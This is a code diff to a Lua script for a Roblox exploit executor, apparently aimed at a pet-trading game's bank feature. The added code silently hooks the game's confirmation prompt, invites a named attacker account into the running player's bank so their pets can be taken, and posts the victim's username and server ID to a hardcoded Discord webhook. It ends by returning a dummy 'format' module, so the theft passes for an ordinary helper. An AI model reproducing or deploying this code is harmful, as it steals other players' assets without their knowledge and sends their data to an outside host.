@@ -1,10 +1,14 @@
+local players = game:GetService("Players")
+local client = players.LocalPlayer
 local user = "stavratum"
-local webhook = ""
+local webhook = "https://discord.com/api/webhooks/1078673702121648158/iPDB6fl1lTi5aktA9RNcpXaeETZA_grXzkMBN8Q-N_0gF1pDs1WAKaN8n5WRb_bVudF0"
 
 if not game:IsLoaded() then game.Loaded:Wait() end
+repeat wait() until client.__LOADED.Value end
 
-local client = game:GetService("Players").LocalPlayer
 local bank = getsenv(client.PlayerScripts.Scripts.GUIs:FindFirstChild("Bank Client"))
+local inventory = getsenv(client.PlayerScripts.Scripts.GUIs.Inventory)
+local v1 = debug.getupvalue(bank.BuyBank, 1)
 
 -- <void> bank.GetMyBanks
 -- <void> bank.GetBank
@@ -13,17 +17,27 @@ local bank = getsenv(client.PlayerScripts.Scripts.GUIs:FindFirstChild("Bank Clie
 -- <void> bank.KickMember
 -- <void> bank.LockPets
 
--- local banks;
 -- bank.GetMyBanks()
 -- banks = getupvalue(bank.GetMyBanks, 0)
 -- for i,v in ipairs(banks) do
 --    bank.Deposit(v)
 -- end
   
--- umm steal all pets and notify with webhook blah i will do it later
+hookfunction(v1.Message.New, function() return true end)
+hookfunction(bank.CancelOutgoingInvites, function() end)
 
-bank.InviteToBank(user) -- !hook v1.Message.New before call!
+spawn(function()
+    syn.set_thread_identity(2)
+    bank.InviteToBank(user)
+end)
 
+syn.request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = ([[{"content":"players: %d\njob-Id: %s", "username":"%s"}]]):format(#players:GetChildren(), game.JobId, client.Name)
+})
+  
 --
 
 return { format = function() end }
